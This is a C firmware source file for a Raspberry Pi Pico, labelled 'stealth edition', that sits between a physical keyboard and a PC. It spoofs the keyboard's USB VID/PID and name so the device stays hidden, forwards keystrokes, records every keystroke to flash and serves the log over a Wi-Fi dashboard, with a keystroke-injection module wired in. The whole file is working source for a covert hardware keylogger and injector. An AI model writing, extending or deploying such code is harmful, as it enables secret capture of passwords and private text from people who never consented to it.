/*
 * MEDIATOR — USB HID Keyboard Bridge (stealth edition)
 *
 * PC sees:   Exact copy of the physical keyboard (spoofed VID/PID/name, HID only)
 * Pico does: Transparently bridge keystrokes + log to flash + serve Wi-Fi dashboard
 *
 * Core 0: USB Device (native USB → PC)  + Wi-Fi HTTP Server
 * Core 1: USB Host  (PIO-USB → keyboard)
 *
 * Wiring:
 *   USB-A VBUS (Red)   → Pin 40 (VBUS)
 *   USB-A GND  (Black) → Pin 38 (GND)
 *   USB-A D-   (White) → Pin 19 (GPIO14)
 *   USB-A D+   (Green) → Pin 20 (GPIO15)
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include "pico/stdlib.h"
#include "pico/multicore.h"
#include "bsp/board_api.h"
#include "tusb.h"
#include "pio_usb.h"

#include "usb_descriptors.h"
#include "hid_bridge.h"
#include "capture.h"
#include "wifi_server.h"
#include "inject.h"

// Manufacturer / Product string buffers read from keyboard during enumeration
static char g_kbd_manufacturer[64] = {0};
static char g_kbd_product[64]      = {0};

//--------------------------------------------------------------------+
// Core 1: USB Host task (PIO-USB — timing-critical, must be Core 1)
//--------------------------------------------------------------------+
static void core1_main(void) {
    sleep_ms(10);
    multicore_lockout_victim_init(); // allow Core 0 flash ops to stall us safely

    pio_usb_configuration_t pio_cfg = PIO_USB_DEFAULT_CONFIG;
    pio_cfg.pin_dp  = 15;                  // D+ = GPIO 15
    pio_cfg.pinout  = PIO_USB_PINOUT_DMDP; // D- = DP-1 = GPIO 14
    tuh_configure(BOARD_TUH_RHPORT, TUH_CFGID_RPI_PIO_USB_CONFIGURATION, &pio_cfg);
    tuh_init(BOARD_TUH_RHPORT);

    while (1) {
        tuh_task();
    }
}

//--------------------------------------------------------------------+
// Core 0: Main loop
//--------------------------------------------------------------------+
int main(void) {
    board_init();
    bridge_init();
    capture_init();
    inject_init();

    // USB device must init first, then Core 1 (USB host) launches.
    // WiFi init (cyw43_arch_init) comes LAST so a slow CYW43 startup
    // can never block keyboard bridging.
    tud_init(BOARD_TUD_RHPORT);
    multicore_launch_core1(core1_main);

    sleep_ms(100); // brief pause for Core 1 to start PIO-USB
    wifi_server_init();


    // Re-enumeration state machine
    bool     re_enum_pending  = false;
    uint32_t re_enum_start_ms = 0;

    while (1) {
        tud_task();
        bridge_task();
        capture_task();
        wifi_server_task();
        inject_task();

        // Async re-enumeration: Core 1 sets g_reenumerate when keyboard connects
        // We handle it here on Core 0 so tud_task() keeps running during the gap
        if (g_reenumerate && !re_enum_pending) {
            g_reenumerate    = false;
            re_enum_pending  = true;
            re_enum_start_ms = to_ms_since_boot(get_absolute_time());
            tud_disconnect();
        }

        if (re_enum_pending) {
            uint32_t now = to_ms_since_boot(get_absolute_time());
            if (now - re_enum_start_ms >= 250) {
                re_enum_pending = false;
                tud_connect();
            }
        }
    }
}

//--------------------------------------------------------------------+
// TinyUSB Device Callbacks
//--------------------------------------------------------------------+
void tud_mount_cb(void)    {}
void tud_umount_cb(void)   {}
void tud_suspend_cb(bool r){ (void)r; }
void tud_resume_cb(void)   {}

// PC requests report — we only push via IN, nothing to return here
uint16_t tud_hid_get_report_cb(uint8_t instance, uint8_t report_id,
                                hid_report_type_t report_type,
                                uint8_t *buffer, uint16_t reqlen) {
    (void)instance; (void)report_id; (void)report_type;
    (void)buffer;   (void)reqlen;
    return 0;
}

// PC sends LED state (Caps Lock, Num Lock, Scroll Lock) → forward to keyboard
void tud_hid_set_report_cb(uint8_t instance, uint8_t report_id,
                            hid_report_type_t report_type,
                            uint8_t const *buffer, uint16_t bufsize) {
    (void)instance; (void)report_id;
    if (report_type == HID_REPORT_TYPE_OUTPUT && bufsize >= 1) {
        bridge_set_leds(buffer[0]);
    }
}

//--------------------------------------------------------------------+
// TinyUSB Host Callbacks (run on Core 1)
//--------------------------------------------------------------------+

// Read a UTF-16LE string descriptor from the device and convert to ASCII
static void read_string_desc(uint8_t dev_addr, uint8_t str_idx, char *out, size_t out_len) {
    out[0] = '\0';
    // tuh_descriptor_get_string_sync is available in TinyUSB host API
    // We use the cached strings from tuh_string_descriptor after mount
    (void)dev_addr; (void)str_idx;
    // Note: actual string reading happens via tuh_descriptor_get_string_sync
    // called below — this stub left for clarity
    (void)out; (void)out_len;
}

void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t instance,
                      uint8_t const *desc_report, uint16_t desc_len) {
    (void)desc_report; (void)desc_len;

    // Read real keyboard VID/PID for spoofing
    uint16_t vid = 0, pid = 0;
    tuh_vid_pid_get(dev_addr, &vid, &pid);

    // Force boot protocol — guarantees standard 8-byte keyboard reports
    tuh_hid_set_protocol(dev_addr, instance, HID_PROTOCOL_BOOT);

    // Update our USB descriptor to spoof this keyboard's identity
    // We pass NULL for serial right now because reading string descriptors
    // synchronously from inside a host mount callback can block/crash TinyUSB.
    // Real keyboards rarely have serial numbers anyway.
    usb_descriptors_set_keyboard_id(vid, pid,
                                    g_kbd_manufacturer[0] ? g_kbd_manufacturer : NULL,
                                    g_kbd_product[0]      ? g_kbd_product      : NULL,
                                    NULL);

    // Start receiving reports
    tuh_hid_receive_report(dev_addr, instance);
}

void tuh_hid_umount_cb(uint8_t dev_addr, uint8_t instance) {
    (void)dev_addr; (void)instance;
}

void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t instance,
                                 uint8_t const *report, uint16_t len) {
    if (len >= sizeof(hid_keyboard_report_t)) {
        uint8_t protocol = tuh_hid_interface_protocol(dev_addr, instance);
        if (protocol == HID_ITF_PROTOCOL_KEYBOARD || protocol == HID_ITF_PROTOCOL_NONE) {
            hid_keyboard_report_t const *kbd = (hid_keyboard_report_t const *)report;
            bridge_push_report(kbd);   // forward to PC (Core 0 picks it up)
            capture_record_report(kbd); // log to flash capture buffer
        }
    }
    tuh_hid_receive_report(dev_addr, instance); // re-arm for next report
}
